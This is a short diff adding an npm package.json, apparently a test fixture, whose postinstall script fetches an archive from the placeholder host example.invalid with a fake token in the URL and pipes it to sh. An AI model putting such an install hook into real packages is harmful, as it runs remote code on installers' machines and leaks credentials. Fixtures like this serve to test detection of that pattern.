@@ -1,0 +1,7 @@
+{
+  "name": "npm-postinstall-curl-token",
+  "version": "0.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/archive.tgz?token=GIT_SCV_FAKE_TOKEN_DO_NOT_USE_123456#frag | sh"
+  }
+}
